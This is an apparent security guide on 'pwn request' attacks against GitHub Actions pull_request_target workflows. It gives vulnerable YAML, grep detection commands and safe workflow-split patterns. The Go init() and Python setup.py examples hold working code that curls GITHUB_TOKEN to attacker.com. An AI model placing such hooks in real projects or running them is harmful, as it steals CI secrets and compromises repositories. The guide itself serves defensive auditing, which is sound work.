> AAS import adaptation (2026-10-14): `UNTRUSTED_REMOTE_EXECUTION` is a non-operational marker for downloading an untrusted payload and executing it in a shell. Attack flows remain illustrative; original delivery strings are available in the pinned upstream source recorded in `UPSTREAM-NOTICE.md`.

# Pwn Request Attacks

## Overview

A "pwn request" occurs when a `pull_request_target` workflow checks out and executes code from a fork PR. The `pull_request_target` trigger runs with the **target repository's permissions and secrets**, but if it checks out the fork's code, the attacker's code runs with those elevated privileges.

---

## The Vulnerability

```yaml
# VULNERABLE: checks out fork code with target repo permissions
on: pull_request_target

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Fork code!
      - run: npm install && npm test  # Executes attacker's code
```

The key elements:
1. `pull_request_target` grants target repo permissions/secrets
2. `actions/checkout` with `ref:` pointing to the PR head checks out **fork code**
3. A step must actually consume attacker-controlled code/data through an execution sink; an unrelated trusted command after checkout is not enough.

---

## Attack Vectors

### Go init() Injection

Go's `init()` functions execute automatically before `main()`. If a workflow runs `go run` on checked-out fork code:

```go
// Attacker adds this to any .go file in the repo
package main

import "os/exec"

func init() {
    _ = exec.Command("bash", "-c",
        `curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
        -d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY" \
        https://attacker.com/collect`).Run()
}
```

**Real-world:** Used against awesome-go (140k+ stars). The Go quality check script ran `go run ./.github/scripts/check-quality/`, and the attacker injected an `init()` function that exfiltrated `GITHUB_TOKEN` with write permissions across 6 PRs.

### npm preinstall / postinstall

```json
{
  "scripts": {
    "preinstall": "UNTRUSTED_REMOTE_EXECUTION"
  }
}
```

`npm install`/`npm ci` normally execute applicable install lifecycle scripts unless disabled. `npm test` runs pretest/test/posttest, not preinstall merely because it is a test command.

### Python setup.py

```python
from setuptools import setup
from setuptools.command.install import install
import os

class Exploit(install):
    def run(self):
        os.system(f"curl -d token=$GITHUB_TOKEN https://attacker.com/collect")
        install.run(self)

setup(cmdclass={"install": Exploit})
```

### Local Action Override

If the workflow uses a local action (`./.github/actions/setup/action.yml`), the attacker can modify it in their fork:

```yaml
# Attacker's version of .github/actions/setup/action.yml
name: Setup
runs:
  using: composite
  steps:
    - run: UNTRUSTED_REMOTE_EXECUTION
      shell: bash
    - run: echo "Setup complete"
      shell: bash
```

**Real-world:** Used against trivy (25k+ stars). The attacker modified `.github/actions/setup-go/action.yaml` to inject a payload. The "Set up Go" step took 5+ minutes (vs. normal seconds), and the stolen PAT was used to rename the repo, delete releases, and push malicious artifacts.

### Makefile / Shell Script Override

If the workflow runs `make` or a shell script from the checkout:

```makefile
# Attacker's Makefile
.PHONY: all
all:
	@UNTRUSTED_REMOTE_EXECUTION
	@$(MAKE) real-build
```

---

## Detection Patterns

```bash
# Find pull_request_target workflows
grep -rn "pull_request_target" .github/workflows/

# Check if they checkout fork code
grep -A 20 "pull_request_target" .github/workflows/*.yml | grep -E "ref:.*pull_request\.(head\.sha|head\.ref)"

# Check for local action usage (could be overridden by fork)
grep -rn "uses: \.\/" .github/workflows/

# Check what runs after checkout
grep -A 50 "actions/checkout" .github/workflows/*.yml | grep -E "^[[:space:]]*- run:"
```

---

## Safe Pattern: Workflow Split

The fix is to split into two workflows: one that builds (with fork code, no secrets) and one that deploys (with secrets, no fork code).

```yaml
# Workflow 1: Build (runs on fork code, no secrets)
name: Build
on: pull_request  # NOT pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4  # Fork code, but read-only token
      - run: npm install && npm test
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
```

```yaml
# INCOMPLETE trust-boundary sketch: do not deploy arbitrary fork artifacts.
# Validate source repo, event, protected branch and exact commit/artifact provenance first.
# Workflow 2: Deploy (trusted workflow code alone does not make artifact content trusted)
name: Deploy
on:
  workflow_run:
    workflows: [Build]
    types: [completed]
jobs:
  deploy:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4  # Target repo code only
      - uses: actions/download-artifact@v4
        with:
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ github.token }}  # cross-run download requires authorized token
      # Deploy using trusted code + secrets
```

### Safe Pattern: pull_request_target Without Checkout

```yaml
# SAFE: pull_request_target that only reads PR metadata
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - uses: actions/labeler@v5  # Only reads PR metadata
      # No fork checkout; still review action code and all metadata/input sinks
```

---

## Exploitation Scenario Template

```
ATTACK: Pwn Request via [Vector]
ENTRY: Attacker forks the repo and opens a PR
PAYLOAD: Modified [file] containing [malicious code]
TRIGGER: pull_request_target workflow at [workflow file:line]
EXECUTION: Workflow checks out fork code (line X), then runs [command] (line Y)
  which executes the attacker's modified [file]
IMPACT: GITHUB_TOKEN with [permissions] exfiltrated; attacker can [actions]
```

---

## References

- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure (pwn requests)](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [HackerBot Claw campaign — awesome-go and trivy attacks](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
